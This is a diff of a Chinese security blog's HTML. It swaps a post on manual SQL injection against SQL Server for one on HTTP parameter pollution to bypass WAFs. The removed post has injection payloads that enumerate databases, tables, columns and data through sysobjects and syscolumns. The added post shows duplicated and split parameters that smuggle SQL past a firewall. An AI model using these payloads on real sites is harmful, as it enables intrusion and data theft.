@@ -15,19 +15,17 @@
 
 
 
-<meta name="description" content="SQL  Server（mssql）（一般搭配asp/asp.net(aspx)+mssql）  数据库结构：">
+<meta name="description" content="HTTP参数污染：我也不知道怎么解释。。语言水平不好。这种方法通常用来绕过WAF应用防火墙的检测。">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL手工注入之SQL Server（mssql）">
-<meta property="og:url" content="http://yoursite.com/2017/04/08/SQL手工注入之mssql/index.html">
+<meta property="og:title" content="HTTP参数污染">
+<meta property="og:url" content="http://yoursite.com/2017/04/18/Http参数污染/index.html">
 <meta property="og:site_name" content="大佬要我改个名">
-<meta property="og:description" content="SQL  Server（mssql）（一般搭配asp/asp.net(aspx)+mssql）  数据库结构：">
-<meta property="og:image" content="http://i.imgur.com/91xXxPj.png">
-<meta property="og:updated_time" content="2017-04-10T10:00:40.511Z">
+<meta property="og:description" content="HTTP参数污染：我也不知道怎么解释。。语言水平不好。这种方法通常用来绕过WAF应用防火墙的检测。">
+<meta property="og:updated_time" content="2017-04-19T01:58:07.366Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL手工注入之SQL Server（mssql）">
-<meta name="twitter:description" content="SQL  Server（mssql）（一般搭配asp/asp.net(aspx)+mssql）  数据库结构：">
-<meta name="twitter:image" content="http://i.imgur.com/91xXxPj.png">
+<meta name="twitter:title" content="HTTP参数污染">
+<meta name="twitter:description" content="HTTP参数污染：我也不知道怎么解释。。语言水平不好。这种方法通常用来绕过WAF应用防火墙的检测。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>SQL手工注入之SQL Server（mssql） | 大佬要我改个名</title>
+<title>HTTP参数污染 | 大佬要我改个名</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -270,11 +268,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-SQL手工注入之mssql" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Http参数污染" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/04/08/SQL手工注入之mssql/" class="article-date">
-      <time datetime="2017-04-08T09:05:13.871Z" itemprop="datePublished">2017-04-08</time>
+      <a href="/2017/04/18/Http参数污染/" class="article-date">
+      <time datetime="2017-04-18T02:06:23.435Z" itemprop="datePublished">2017-04-18</time>
 </a>
 
 
@@ -289,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SQL手工注入之SQL Server（mssql）
+      HTTP参数污染
     </h1>
   
 
@@ -306,27 +304,16 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <ol>
-<li>SQL  Server（mssql）（一般搭配asp/asp.net(aspx)+mssql）</li>
-</ol>
-<p>数据库结构：<br><a id="more"></a><br><img src="http://i.imgur.com/91xXxPj.png" alt=""></p>
+        <p>HTTP参数污染：我也不知道怎么解释。。语言水平不好。这种方法通常用来绕过WAF应用防火墙的检测。</p>
+<a id="more"></a>
+<p>PHP类型：<br><a href="http://127.0.0.1/test.php?id=7" target="_blank" rel="external">http://127.0.0.1/test.php?id=7</a> or 1=1 in (SQLi)<br>如果会出现“请停止攻击该网站”等提示。</p>
+<p>这时我们可以尝试参数污染来绕过该WAF。<br>当我们输入<br>?id=7&amp;id=（sqli)时</p>
+<p>waf网络层会解析id=7， –&gt;  显示合法<br>PHP应用层会解析  id=(sqli) –&gt; 注入成功</p>
+<p>利用：把参数利用拼接符写在后面来绕过。</p>
 <hr>
-<p>权限：1.最高：sa（任何操作：文件管理/数据库操作/命令执行等）<br>2.普通：db（文件管理，数据库操作等）<br>3.最菜：public（数据库操作）</p>
-<hr>
-<p>注入（手工判断）：</p>
-<ol>
-<li>And 1=1和and 1=2 组合判断 （用永真和永假判断）</li>
-</ol>
-<ol>
-<li>and (select count(*) from sysobjects)&gt;0 返回正常就是mssql数据库</li>
-</ol>
-<p>版本信息查看：and 1=(select @@version)<br>获取当前网站所用数据库库名：and 1=(select db_name())<br>获取第一个数据库库名：<br>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)<br>获取第二个数据库库名：<br>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’)<br>获取第三个数据库库名：<br>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个数据库库名’ and name &lt;&gt; ‘第二个数据库库名’)<br>其它同理。。。。</p>
-<ol>
-<li>获取第一个当前使用的数据库表名：<br>and 1=(select top 1 name from sysobjects where xtype=’u’)<br>and 1=(select top 1 name from sysobjects where xtype=’u’ and name &lt;&gt;’第一个表名’)<br>其它同理。。。</li>
-<li>获取第一个当前使用的数据库的表里面的列名：<br>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’))<br>获取第二个列明<br>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = ‘表名’)and name&lt;&gt; ‘第一个列名’)<br>其它同理。。</li>
-<li>获取列内容（假如表是users列是name）<br>and 1=(select top 1 name from users)<br>其它同理。。。。</li>
-</ol>
-<hr>
+<p>asp类型:  ?id=1&amp;id=s&amp;id=e&amp;id=l&amp;id=e&amp;id=c&amp;id=t</p>
+<p>如果它接受到两个参数值，它会拼接两个相同参数的值，因此你可以将被过滤的关键词拆分到两个参数中进行攻击从而绕过WAF。</p>
+<p>如上面我写参数拼接在一起的就带有selec效果了。</p>
 
       
     </div>
@@ -335,13 +322,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/04/08/SQL手工注入之mssql/">SQL手工注入之SQL Server（mssql）</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/18/Http参数污染/">HTTP参数污染</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mark</a></p>
-        <p><span>发布时间:</span>2017-04-08, 17:05:13</p>
-        <p><span>最后更新:</span>2017-04-10, 18:00:40</p>
+        <p><span>发布时间:</span>2017-04-18, 10:06:23</p>
+        <p><span>最后更新:</span>2017-04-19, 09:58:07</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/04/08/SQL手工注入之mssql/" title="SQL手工注入之SQL Server（mssql）">http://yoursite.com/2017/04/08/SQL手工注入之mssql/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/08/SQL手工注入之mssql/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/18/Http参数污染/" title="HTTP参数污染">http://yoursite.com/2017/04/18/Http参数污染/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/18/Http参数污染/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -354,17 +341,11 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/04/08/SQL注入之类型简介/">
-                    SQL注入之类型简介
+                <a href="/2017/04/15/旁注攻击/">
+                    旁注攻击
                 </a>
             </div>
         
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/04/08/SQL手工注入之Access/">
-                    SQL手工注入之Access
-                </a>
-            </div>
         
     </nav>
 
@@ -410,7 +391,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"SQL手工注入之SQL Server（mssql）　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"HTTP参数污染　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -430,7 +411,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/04/08/SQL注入之类型简介/" title="上一篇: SQL注入之类型简介">
+            <a href="/2017/04/15/旁注攻击/" title="上一篇: 旁注攻击">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -438,9 +419,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/04/08/SQL手工注入之Access/" title="下一篇: SQL手工注入之Access">
-                <i class="fa fa-angle-right"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
 
